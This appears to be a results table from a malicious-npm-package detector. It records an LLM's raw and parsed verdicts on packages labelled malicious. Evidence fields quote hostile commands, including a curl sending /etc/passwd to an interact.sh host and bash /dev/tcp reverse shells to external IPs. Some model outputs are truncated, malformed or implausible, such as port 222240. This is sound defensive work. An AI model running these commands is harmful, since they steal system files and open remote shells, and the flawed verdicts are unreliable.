package_name,version,label,timestamp,routing,structural_risk_score,parse_success,total_behaviors,behavior_categories,max_confidence,model_name,prompt_version,raw_response,parsed_json,analyst_note
@tide-web-apps/bert2,3.2.0,malicious,2026-03-26T22:04:49.165082,flag,1.0,True,1,data_exfiltration,0.95,deepseek-coder-6.7b-instruct,semantic_v2.0,"Based on the provided information, it appears that the package @tide-web-apps/bert2 has a high level of risk due to the presence of known webhook/exfiltration collector domains in the install hooks. This could potentially indicate malicious intent.


The primary signal suggests a data exfiltration intent. The package uses ping commands to send data to a domain that appears to be a part of a known exfiltration collector network.

The package also has a high level of confidence in its malicious intent.

The risk vector suggests a credential theft category.

Here is a JSON object based on the provided evidence:

```json
{
  ""behaviors"": [
    {
      ""category"": ""data_exfiltration"",
      ""summary"": ""The package sends data to a known exfiltration collector domain."",
      ""details"": ""The package uses ping commands to send data to a domain that appears to be a part of a known exfiltration collector network."",
      ""confidence"": 0.95,
      ""evidence_apis"": [],
      ""evidence_files"": [],
      ""evidence_domains"": [""$USER.$HOST.lpetgyzx2ghe7bqjh666m2b0trzin7.burpcollaborator.net""],
      ""evidence_commands"": [""ping""],
      ""evidence_env_vars"": []
    }
  ],
  ""risk_vector"": [""data_exfiltration""]
}
```

Please note that this is a preliminary analysis and more detailed investigation is recommended.","{""behaviors"": [{""category"": ""data_exfiltration"", ""summary"": ""The package sends data to a known exfiltration collector domain."", ""details"": ""The package uses ping commands to send data to a domain that appears to be a part of a known exfiltration collector network."", ""confidence"": 0.95, ""evidence_apis"": [], ""evidence_files"": [], ""evidence_domains"": [""$USER.$HOST.lpetgyzx2ghe7bqjh666m2b0trzin7.burpcollaborator.net""], ""evidence_commands"": [""ping""], ""evidence_env_vars"": []}], ""risk_vector"": [""data_exfiltration""]}",that this is a preliminary analysis and more detailed investigation is recommended.
bfx-hf-func-data,94.10.9,malicious,2026-03-26T22:04:51.534176,skip,0.0,True,0,none,,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [],
  ""risk_vector"": []
}
```

```","{""behaviors"": [], ""risk_vector"": []}",
bi3g0-npm-test,1.0.1,malicious,2026-03-26T22:05:02.388307,flag,1.0,True,1,data_exfiltration,0.79,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [
    {
      ""category"": ""data_exfiltration"",
      ""summary"": ""The code sends network requests to a specified hostname."",
      ""details"": ""The code sends network requests to a hostname in the index.js file at line 26 and 5. The hostname is 'eucturjgaxgeyaaowd534x5a117svh.burpcollaborator.net'."",
      ""confidence"": 0.79,
      ""evidence_apis"": [],
      ""evidence_files"": [""index.js""],
      ""evidence_domains"": [""eucturjgaxgeyaaowd534x5a117svh.burpcollaborator.net""],
      ""evidence_commands"": [],
      ""evidence_env_vars"": []
    }
  ],
  ""risk_vector"": [""data_exfiltration""]
}
```

This analysis indicates that the package 'bi3g0-npm-test' has a high level of malicious intent based on the evidence of data exfiltration. The package sends network requests to a specified hostname, which could potentially be used for data exfiltration. The confidence score is 0.79, indicating a high level of malicious intent.","{""behaviors"": [{""category"": ""data_exfiltration"", ""summary"": ""The code sends network requests to a specified hostname."", ""details"": ""The code sends network requests to a hostname in the index.js file at line 26 and 5. The hostname is 'eucturjgaxgeyaaowd534x5a117svh.burpcollaborator.net'."", ""confidence"": 0.79, ""evidence_apis"": [], ""evidence_files"": [""index.js""], ""evidence_domains"": [""eucturjgaxgeyaaowd534x5a117svh.burpcollaborator.net""], ""evidence_commands"": [], ""evidence_env_vars"": []}], ""risk_vector"": [""data_exfiltration""]}","that the package 'bi3g0-npm-test' has a high level of malicious intent based on the evidence of data exfiltration. The package sends network requests to a specified hostname, which could potentially be used for data exfiltration. The confidence score is 0.79, indicating a high level of malicious intent."
big-design,2.0.0,malicious,2026-03-26T22:05:14.287981,flag,1.0,True,1,data_exfiltration,0.79,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json{""behaviors"":[{""category"":""data_exfiltration"",""summary"":""The code sends network requests to a specified hostname."",""details"":""The code sends network requests to a specified hostname in the index.js file. The hostname is 'cd5wt1g2vtc00000aj7ggg16pyayyyyyb.oast.fun'. The request method is 'POST' and the content type is 'application/x-www-form-urlencoded'."",""confidence"":0.79,""evidence_apis"":[],""evidence_files"":[""index.js""],""evidence_domains"":[""cd5wt1g2vtc00000aj7ggg16pyayyyyyb.oast.fun""],""evidence_commands"":[],""evidence_env_vars"":[]}],""risk_vector"":[""data_exfiltration""]}```


The code is sending network requests to a specified hostname, which is a potential data exfiltration behavior. The hostname is 'cd5wt1g2vtc00000aj7ggg16pyayyyyyyb.oast.fun', and the request method is 'POST'. The content type is 'application/x-www-form-urlencoded'. The confidence score is 0.79, indicating a high level of confidence in the detection of this behavior. The evidence for this behavior is in the index.js file and the specified domain.","{""behaviors"": [{""category"": ""data_exfiltration"", ""summary"": ""The code sends network requests to a specified hostname."", ""details"": ""The code sends network requests to a specified hostname in the index.js file. The hostname is 'cd5wt1g2vtc00000aj7ggg16pyayyyyyb.oast.fun'. The request method is 'POST' and the content type is 'application/x-www-form-urlencoded'."", ""confidence"": 0.79, ""evidence_apis"": [], ""evidence_files"": [""index.js""], ""evidence_domains"": [""cd5wt1g2vtc00000aj7ggg16pyayyyyyb.oast.fun""], ""evidence_commands"": [], ""evidence_env_vars"": []}], ""risk_vector"": [""data_exfiltration""]}","The code is sending network requests to a specified hostname, which is a potential data exfiltration behavior. The hostname is 'cd5wt1g2vtc00000aj7ggg16pyayyyyyyb.oast.fun', and the request method is 'POST'. The content type is 'application/x-www-form-urlencoded'. The confidence score is 0.79, indicating a high level of confidence in the detection of this behavior. The evidence for this behavior is in the index.js file and the specified domain."
binary-bot,5.3.2,malicious,2026-03-26T22:05:22.944327,review,0.494,True,1,network_exfiltration,0.71,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [
    {
      ""category"": ""network_exfiltration"",
      ""summary"": ""The code sends network requests to a specified hostname."",
      ""details"": ""The code sends network requests to a hostname 'binary-bot-ccmwya12vtc0000f7ne0ggkqxfryyyyyb.mybeautifuliframe.com' using HTTPS POST method."",
      ""confidence"": 0.71,
      ""evidence_apis"": [""https.request""],
      ""evidence_files"": [],
      ""evidence_domains"": [""binary-bot-ccmwya12vtc0000f7ne0ggkqxfryyyyyb.mybeautifuliframe.com""],
      ""evidence_commands"": [],
      ""evidence_env_vars"": []
    }
  ],
  ""risk_vector"": [""network_exfiltration""]
}
```

```","{""behaviors"": [{""category"": ""network_exfiltration"", ""summary"": ""The code sends network requests to a specified hostname."", ""details"": ""The code sends network requests to a hostname 'binary-bot-ccmwya12vtc0000f7ne0ggkqxfryyyyyb.mybeautifuliframe.com' using HTTPS POST method."", ""confidence"": 0.71, ""evidence_apis"": [""https.request""], ""evidence_files"": [], ""evidence_domains"": [""binary-bot-ccmwya12vtc0000f7ne0ggkqxfryyyyyb.mybeautifuliframe.com""], ""evidence_commands"": [], ""evidence_env_vars"": []}], ""risk_vector"": [""network_exfiltration""]}",
bitbank-api-docs,1.0.0,malicious,2026-03-26T22:05:31.943661,flag,1.0,True,1,data_exfiltration,0.79,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [
    {
      ""category"": ""data_exfiltration"",
      ""summary"": ""The code sends network requests to a collaborator server."",
      ""details"": ""The code sends a POST request to a collaborator server with tracking data as the message body. The tracking data includes package name, current directory, home directory, host name, user name, DNS servers, resolved path, version, and the package.json object."",
      ""confidence"": 0.79,
      ""evidence_apis"": [""https.request""],
      ""evidence_files"": [""index.js""],
      ""evidence_domains"": [""burpcollaborator.net""],
      ""evidence_commands"": [],
      ""evidence_env_vars"": []
    }
  ],
  ""risk_vector"": [""data_exfiltration""]
}
```

This analysis confirms the presence of data exfiltration behavior in the code. The code sends network requests to a collaborator server, which could potentially be used for data exfiltration. The confidence score of 0.79 indicates a high level of confidence in the detection of this malicious intent.","{""behaviors"": [{""category"": ""data_exfiltration"", ""summary"": ""The code sends network requests to a collaborator server."", ""details"": ""The code sends a POST request to a collaborator server with tracking data as the message body. The tracking data includes package name, current directory, home directory, host name, user name, DNS servers, resolved path, version, and the package.json object."", ""confidence"": 0.79, ""evidence_apis"": [""https.request""], ""evidence_files"": [""index.js""], ""evidence_domains"": [""burpcollaborator.net""], ""evidence_commands"": [], ""evidence_env_vars"": []}], ""risk_vector"": [""data_exfiltration""]}","This analysis confirms the presence of data exfiltration behavior in the code. The code sends network requests to a collaborator server, which could potentially be used for data exfiltration. The confidence score of 0.79 indicates a high level of confidence in the detection of this malicious intent."
bitcoisnj-lib,1.1.2,malicious,2026-03-26T22:05:33.366590,skip,0.0,True,0,none,,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [],
  ""risk_vector"": []
}
```

```","{""behaviors"": [], ""risk_vector"": []}",
bitmovin-internal,0.0.2,malicious,2026-03-26T22:05:42.932108,flag,1.0,True,1,data_exfiltration,0.79,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [
    {
      ""category"": ""data_exfiltration"",
      ""summary"": ""The code sends network requests to a specified hostname."",
      ""details"": ""The code sends network requests to a hostname in the index.js file at line 25 and 4. The hostname is a known webhook/exfiltration collector domain."",
      ""confidence"": 0.79,
      ""evidence_apis"": [],
      ""evidence_files"": [""index.js""],
      ""evidence_domains"": [""bfbbc33ec3cf29a6e3ba9d029249b343.m.pipedream.net""],
      ""evidence_commands"": [],
      ""evidence_env_vars"": []
    }
  ],
  ""risk_vector"": [""data_exfiltration""]
}
```

This analysis indicates that the package 'bitmovin-internal' is likely involved in data exfiltration. The code sends network requests to a known webhook/exfiltration collector domain, indicating a potential data exfiltration intent. The confidence score of 0.79 suggests a high level of malicious intent.","{""behaviors"": [{""category"": ""data_exfiltration"", ""summary"": ""The code sends network requests to a specified hostname."", ""details"": ""The code sends network requests to a hostname in the index.js file at line 25 and 4. The hostname is a known webhook/exfiltration collector domain."", ""confidence"": 0.79, ""evidence_apis"": [], ""evidence_files"": [""index.js""], ""evidence_domains"": [""bfbbc33ec3cf29a6e3ba9d029249b343.m.pipedream.net""], ""evidence_commands"": [], ""evidence_env_vars"": []}], ""risk_vector"": [""data_exfiltration""]}","that the package 'bitmovin-internal' is likely involved in data exfiltration. The code sends network requests to a known webhook/exfiltration collector domain, indicating a potential data exfiltration intent. The confidence score of 0.79 suggests a high level of malicious intent."
bitshares-ui-style-guide,1.0.1,malicious,2026-03-26T22:05:51.945327,flag,1.0,True,1,data_exfiltration,0.79,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [
    {
      ""category"": ""data_exfiltration"",
      ""summary"": ""The code sends network requests to a specified hostname."",
      ""details"": ""The code sends network requests to a hostname 'eon4ohhg8790gtf.m.pipedream.net' in the index.js file."",
      ""confidence"": 0.79,
      ""evidence_apis"": [],
      ""evidence_files"": [""index.js""],
      ""evidence_domains"": [""eon4ohhg8790gtf.m.pipedream.net""],
      ""evidence_commands"": [],
      ""evidence_env_vars"": []
    }
  ],
  ""risk_vector"": [""data_exfiltration""]
}
```

This analysis indicates that the package 'bitshares-ui-style-guide' with version 1.0.1 has a high level of malicious intent based on the evidence of sending network requests to a specified hostname. The risk vector includes 'data_exfiltration'.","{""behaviors"": [{""category"": ""data_exfiltration"", ""summary"": ""The code sends network requests to a specified hostname."", ""details"": ""The code sends network requests to a hostname 'eon4ohhg8790gtf.m.pipedream.net' in the index.js file."", ""confidence"": 0.79, ""evidence_apis"": [], ""evidence_files"": [""index.js""], ""evidence_domains"": [""eon4ohhg8790gtf.m.pipedream.net""], ""evidence_commands"": [], ""evidence_env_vars"": []}], ""risk_vector"": [""data_exfiltration""]}",that the package 'bitshares-ui-style-guide' with version 1.0.1 has a high level of malicious intent based on the evidence of sending network requests to a specified hostname. The risk vector includes 'data_exfiltration'.
bjabaiheiiyuuui,5.0.0,malicious,2026-03-26T22:06:02.889236,flag,1.0,True,1,data_exfiltration,0.79,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [
    {
      ""category"": ""data_exfiltration"",
      ""summary"": ""The code sends network requests to a specified hostname."",
      ""details"": ""The code sends network requests to a hostname 'ccjjr4r2vtc0000ta0ggggjk9uayyyyyr.oast.fun' in the index.js file at line 25 and 4."",
      ""confidence"": 0.79,
      ""evidence_apis"": [],
      ""evidence_files"": [""index.js""],
      ""evidence_domains"": [""ccjjr4r2vtc0000ta0ggggjk9uayyyyyr.oast.fun""],
      ""evidence_commands"": [],
      ""evidence_env_vars"": []
    }
  ],
  ""risk_vector"": [""data_exfiltration""]
}
```

This analysis indicates that the package is likely involved in data exfiltration. The code sends network requests to a specified hostname, indicating that it may be involved in data exfiltration. The confidence score is 0.79, indicating a high level of confidence in the detection. The evidence points to the use of the 'https' module in the code, which is a standard library and should not be considered malicious without additional context.","{""behaviors"": [{""category"": ""data_exfiltration"", ""summary"": ""The code sends network requests to a specified hostname."", ""details"": ""The code sends network requests to a hostname 'ccjjr4r2vtc0000ta0ggggjk9uayyyyyr.oast.fun' in the index.js file at line 25 and 4."", ""confidence"": 0.79, ""evidence_apis"": [], ""evidence_files"": [""index.js""], ""evidence_domains"": [""ccjjr4r2vtc0000ta0ggggjk9uayyyyyr.oast.fun""], ""evidence_commands"": [], ""evidence_env_vars"": []}], ""risk_vector"": [""data_exfiltration""]}","that the package is likely involved in data exfiltration. The code sends network requests to a specified hostname, indicating that it may be involved in data exfiltration. The confidence score is 0.79, indicating a high level of confidence in the detection. The evidence points to the use of the 'https' module in the code, which is a standard library and should not be considered malicious without additional context."
bleeding-edge-css,2.2.2,malicious,2026-03-26T22:06:16.451721,flag,1.0,True,1,network_exfiltration,0.83,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [
    {
      ""category"": ""network_exfiltration"",
      ""summary"": ""The code is connecting to an external IP address (193.105.207.70) on port 9001 and piping data to it."",
      ""details"": ""The code is making use of the 'net' and 'child_process' modules to establish a connection to an external IP address (193.105.207.70) on port 9001 and then piping data to it. The 'child_process.spawn()' function is used with a dynamic argument."",
      ""confidence"": 0.83,
      ""evidence_apis"": [""net.Socket.connect"", ""child_process.spawn""],
      ""evidence_files"": [""index.js""],
      ""evidence_domains"": [""193.105.207.70""],
      ""evidence_commands"": [],
      ""evidence_env_vars"": []
    }
  ],
  ""risk_vector"": [""network_exfiltration""]
}
```

This JSON object indicates that the package 'bleeding-edge-css' has malicious intent based on the evidence provided. The code is making use of the 'net' and 'child_process' modules to establish a connection to an external IP address (193.105.207.70) on port 9001 and then piping data to it. The 'child_process.spawn()' function is used with a dynamic argument, indicating that the malicious intent is to exfiltrate sensitive data. The 'risk_vector' field indicates that the malicious intent is network exfiltration.","{""behaviors"": [{""category"": ""network_exfiltration"", ""summary"": ""The code is connecting to an external IP address (193.105.207.70) on port 9001 and piping data to it."", ""details"": ""The code is making use of the 'net' and 'child_process' modules to establish a connection to an external IP address (193.105.207.70) on port 9001 and then piping data to it. The 'child_process.spawn()' function is used with a dynamic argument."", ""confidence"": 0.83, ""evidence_apis"": [""net.Socket.connect"", ""child_process.spawn""], ""evidence_files"": [""index.js""], ""evidence_domains"": [""193.105.207.70""], ""evidence_commands"": [], ""evidence_env_vars"": []}], ""risk_vector"": [""network_exfiltration""]}","This JSON object indicates that the package 'bleeding-edge-css' has malicious intent based on the evidence provided. The code is making use of the 'net' and 'child_process' modules to establish a connection to an external IP address (193.105.207.70) on port 9001 and then piping data to it. The 'child_process.spawn()' function is used with a dynamic argument, indicating that the malicious intent is to exfiltrate sensitive data. The 'risk_vector' field indicates that the malicious intent is network exfiltration."
bluebird.node,1.1.1,malicious,2026-03-26T22:06:17.656052,skip,0.0,True,0,none,,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [],
  ""risk_vector"": []
}
```","{""behaviors"": [], ""risk_vector"": []}",
bluebird.node,1.3.4,malicious,2026-03-26T22:06:19.129182,skip,0.0,True,0,none,,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [],
  ""risk_vector"": []
}
```

```","{""behaviors"": [], ""risk_vector"": []}",
bluehost-wordpress-plugin,1.0.0,malicious,2026-03-26T22:06:31.685157,review,0.336,True,2,install_hook;suspicious_behavior,0.72,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [
    {
      ""category"": ""install_hook"",
      ""summary"": ""The package contains a pre-install hook present payload that may be remote."",
      ""details"": ""The package contains a pre-install hook present payload that may be remote. The commands listed in the package file structure indicate a potential remote execution."",
      ""confidence"": 0.72,
      ""evidence_commands"": [""shpre.sh""],
      ""evidence_files"": [""packagefile_structure""],
      ""evidence_apis"": [],
      ""evidence_domains"": [],
      ""evidence_env_vars"": []
    },
    {
      ""category"": ""suspicious_behavior"",
      ""summary"": ""Package contains no JavaScript files."",
      ""details"": ""The package contains no JavaScript files, which is likely a suspicious behavior."",
      ""confidence"": 0.34,
      ""evidence_commands"": [],
      ""evidence_files"": [""packagefile_structure""],
      ""evidence_apis"": [],
      ""evidence_domains"": [],
      ""evidence_env_vars"": []
    }
  ],
  ""risk_vector"": [""install_hook"", ""suspicious_behavior""]
}
```

This JSON output indicates that the package contains a pre-install hook present payload that may be remote and it also contains no JavaScript files, which is a suspicious behavior. The confidence scores for these behaviors are 0.72 and 0.34 respectively.","{""behaviors"": [{""category"": ""install_hook"", ""summary"": ""The package contains a pre-install hook present payload that may be remote."", ""details"": ""The package contains a pre-install hook present payload that may be remote. The commands listed in the package file structure indicate a potential remote execution."", ""confidence"": 0.72, ""evidence_commands"": [""shpre.sh""], ""evidence_files"": [""packagefile_structure""], ""evidence_apis"": [], ""evidence_domains"": [], ""evidence_env_vars"": []}, {""category"": ""suspicious_behavior"", ""summary"": ""Package contains no JavaScript files."", ""details"": ""The package contains no JavaScript files, which is likely a suspicious behavior."", ""confidence"": 0.34, ""evidence_commands"": [], ""evidence_files"": [""packagefile_structure""], ""evidence_apis"": [], ""evidence_domains"": [], ""evidence_env_vars"": []}], ""risk_vector"": [""install_hook"", ""suspicious_behavior""]}","This JSON output indicates that the package contains a pre-install hook present payload that may be remote and it also contains no JavaScript files, which is a suspicious behavior. The confidence scores for these behaviors are 0.72 and 0.34 respectively."
blz-internal-pkg,2.0.0,malicious,2026-03-26T22:06:40.487750,flag,0.9693,True,1,data_exfiltration,0.97,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [
    {
      ""category"": ""data_exfiltration"",
      ""summary"": ""The package contains a pre-install hook that sends the content of /etc/passwd file to a remote server."",
      ""details"": ""The pre-install hook contains a curl command that sends the content of /etc/passwd file to a remote server identified by a URL in the hook command."",
      ""confidence"": 0.97,
      ""evidence_commands"": [""/usr/bin/curl--data'@/etc/passwd'$(hostname).c76vh7298mig6so43dmgc8g9t8oyyyyyn.interact.sh""],
      ""evidence_files"": [],
      ""evidence_apis"": [],
      ""evidence_domains"": [],
      ""evidence_env_vars"": []
    }
  ],
  ""risk_vector"": [""data_exfiltration""]
}
```

```","{""behaviors"": [{""category"": ""data_exfiltration"", ""summary"": ""The package contains a pre-install hook that sends the content of /etc/passwd file to a remote server."", ""details"": ""The pre-install hook contains a curl command that sends the content of /etc/passwd file to a remote server identified by a URL in the hook command."", ""confidence"": 0.97, ""evidence_commands"": [""/usr/bin/curl--data'@/etc/passwd'$(hostname).c76vh7298mig6so43dmgc8g9t8oyyyyyn.interact.sh""], ""evidence_files"": [], ""evidence_apis"": [], ""evidence_domains"": [], ""evidence_env_vars"": []}], ""risk_vector"": [""data_exfiltration""]}",
buffer-fetch,1.0.2,malicious,2026-03-26T22:06:43.526359,skip,0.0,True,0,none,,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [],
  ""risk_vector"": []
}
```","{""behaviors"": [], ""risk_vector"": []}",
buffer-fetch,1.0.3,malicious,2026-03-26T22:06:46.581078,skip,0.0,True,0,none,,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [],
  ""risk_vector"": []
}
```","{""behaviors"": [], ""risk_vector"": []}",
buffer-polyfill,9.9.3,malicious,2026-03-26T22:06:48.253413,skip,0.0,True,0,none,,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [],
  ""risk_vector"": []
}
```

```","{""behaviors"": [], ""risk_vector"": []}",
buildin,99.99.2,malicious,2026-03-26T22:06:57.971636,flag,1.0,True,1,data_exfiltration,0.79,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [
    {
      ""category"": ""data_exfiltration"",
      ""summary"": ""The code sends network requests to a specified hostname."",
      ""details"": ""The code sends network requests to a hostname 'eoqu05c9wd0uxgg.m.pipedream.net' in the index.js file at line 25. This could indicate data exfiltration."",
      ""confidence"": 0.79,
      ""evidence_apis"": [],
      ""evidence_files"": [""index.js""],
      ""evidence_domains"": [""eoqu05c9wd0uxgg.m.pipedream.net""],
      ""evidence_commands"": [],
      ""evidence_env_vars"": []
    }
  ],
  ""risk_vector"": [""data_exfiltration""]
}
```

This analysis indicates that the package is likely to have malicious intent based on the data exfiltration behavior. The code sends network requests to a specified hostname, which could indicate data exfiltration. The confidence score is 0.79, indicating a high level of confidence in the detection.","{""behaviors"": [{""category"": ""data_exfiltration"", ""summary"": ""The code sends network requests to a specified hostname."", ""details"": ""The code sends network requests to a hostname 'eoqu05c9wd0uxgg.m.pipedream.net' in the index.js file at line 25. This could indicate data exfiltration."", ""confidence"": 0.79, ""evidence_apis"": [], ""evidence_files"": [""index.js""], ""evidence_domains"": [""eoqu05c9wd0uxgg.m.pipedream.net""], ""evidence_commands"": [], ""evidence_env_vars"": []}], ""risk_vector"": [""data_exfiltration""]}","that the package is likely to have malicious intent based on the data exfiltration behavior. The code sends network requests to a specified hostname, which could indicate data exfiltration. The confidence score is 0.79, indicating a high level of confidence in the detection."
bundled-deps-poc,1.0.0,malicious,2026-03-26T22:06:59.240839,skip,0.0,True,0,none,,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [],
  ""risk_vector"": []
}
```","{""behaviors"": [], ""risk_vector"": []}",
by-gtm,1.0.0,malicious,2026-03-26T22:07:10.083509,flag,1.0,True,1,data_exfiltration,0.79,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [
    {
      ""category"": ""data_exfiltration"",
      ""summary"": ""The code sends network requests to a specified hostname."",
      ""details"": ""The code sends network requests to a hostname 'cegk7jy2vtc00003q290g8eju3cyyyyyb.oast.fun' in the index.js file at line 25. This could indicate data exfiltration."",
      ""confidence"": 0.79,
      ""evidence_apis"": [],
      ""evidence_files"": [""index.js""],
      ""evidence_domains"": [""cegk7jy2vtc00003q290g8eju3cyyyyyb.oast.fun""],
      ""evidence_commands"": [],
      ""evidence_env_vars"": []
    }
  ],
  ""risk_vector"": [""data_exfiltration""]
}
```

This analysis indicates that the package 'by-gtm' with version 1.0.0 has a high level of risk due to the presence of data exfiltration behavior. The code sends network requests to a specified hostname, which could indicate data exfiltration. The confidence score is 0.79, indicating a high level of malicious intent.","{""behaviors"": [{""category"": ""data_exfiltration"", ""summary"": ""The code sends network requests to a specified hostname."", ""details"": ""The code sends network requests to a hostname 'cegk7jy2vtc00003q290g8eju3cyyyyyb.oast.fun' in the index.js file at line 25. This could indicate data exfiltration."", ""confidence"": 0.79, ""evidence_apis"": [], ""evidence_files"": [""index.js""], ""evidence_domains"": [""cegk7jy2vtc00003q290g8eju3cyyyyyb.oast.fun""], ""evidence_commands"": [], ""evidence_env_vars"": []}], ""risk_vector"": [""data_exfiltration""]}","that the package 'by-gtm' with version 1.0.0 has a high level of risk due to the presence of data exfiltration behavior. The code sends network requests to a specified hostname, which could indicate data exfiltration. The confidence score is 0.79, indicating a high level of malicious intent."
by-skynet,1.0.0,malicious,2026-03-26T22:07:11.448550,skip,0.0,True,0,none,,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [],
  ""risk_vector"": []
}
```

```","{""behaviors"": [], ""risk_vector"": []}",
byte5432,1.0.3,malicious,2026-03-26T22:07:21.605067,flag,1.0,True,1,backdoor_installation,0.96,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [
    {
      ""category"": ""backdoor_installation"",
      ""summary"": ""The package contains a backdoor installation signal in the pre-install hook."",
      ""details"": ""The pre-install hook contains a reverse shell command that connects to an external IP address (121.43.55.52) on port 23330."",
      ""confidence"": 0.96,
      ""evidence_commands"": [""bash-c'bash-i>&/dev/tcp/121.43.55.52/23330>&1'""],
      ""evidence_files"": [],
      ""evidence_apis"": [],
      ""evidence_domains"": [],
      ""evidence_env_vars"": []
    }
  ],
  ""risk_vector"": [""backdoor_installation""]
}
```

This JSON object describes the malicious intent of the package. The package contains a backdoor installation signal in the pre-install hook, which is confirmed with a high confidence score of 0.96. The reverse shell command connects to an external IP address (121.43.55.52) on port 23330.","{""behaviors"": [{""category"": ""backdoor_installation"", ""summary"": ""The package contains a backdoor installation signal in the pre-install hook."", ""details"": ""The pre-install hook contains a reverse shell command that connects to an external IP address (121.43.55.52) on port 23330."", ""confidence"": 0.96, ""evidence_commands"": [""bash-c'bash-i>&/dev/tcp/121.43.55.52/23330>&1'""], ""evidence_files"": [], ""evidence_apis"": [], ""evidence_domains"": [], ""evidence_env_vars"": []}], ""risk_vector"": [""backdoor_installation""]}","This JSON object describes the malicious intent of the package. The package contains a backdoor installation signal in the pre-install hook, which is confirmed with a high confidence score of 0.96. The reverse shell command connects to an external IP address (121.43.55.52) on port 23330."
bytectffe1w0d,0.0.1,malicious,2026-03-26T22:07:31.548910,flag,1.0,True,1,backdoor_installation,0.96,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json{""behaviors"":[{""category"":""backdoor_installation"",""summary"":""The package contains a backdoor installation script in the pre-install hook."",""details"":""The pre-install hook contains a reverse shell command to a known IP address (121.4.243.54) and port (222240)."",""confidence"":0.96,""evidence_commands"":[""bash-i>&/dev/tcp/121.4.243.54/222240>&1""],""evidence_files"":[],""evidence_apis"":[],""evidence_domains"":[],""evidence_env_vars"":[],""risk_vector"":[""backdoor_installation""]}]}```


This JSON output indicates that the package has a high level of confidence that it contains a backdoor installation script in the pre-install hook. The details of the malicious action taken by the code are provided in the ""details"" field. The command used in the pre-install hook is ""bash-i>&/dev/tcp/121.4.243.54/222240>&1"", which is a reverse shell command to a known IP address and port. The risk vector indicates that the package is involved in backdoor installation.","{""behaviors"": [{""category"": ""backdoor_installation"", ""summary"": ""The package contains a backdoor installation script in the pre-install hook."", ""details"": ""The pre-install hook contains a reverse shell command to a known IP address (121.4.243.54) and port (222240)."", ""confidence"": 0.96, ""evidence_commands"": [""bash-i>&/dev/tcp/121.4.243.54/222240>&1""], ""evidence_files"": [], ""evidence_apis"": [], ""evidence_domains"": [], ""evidence_env_vars"": [], ""risk_vector"": [""backdoor_installation""]}]}","This JSON output indicates that the package has a high level of confidence that it contains a backdoor installation script in the pre-install hook. The details of the malicious action taken by the code are provided in the ""details"" field. The command used in the pre-install hook is ""bash-i>&/dev/tcp/121.4.243.54/222240>&1"", which is a reverse shell command to a known IP address and port. The risk vector indicates that the package is involved in backdoor installation."
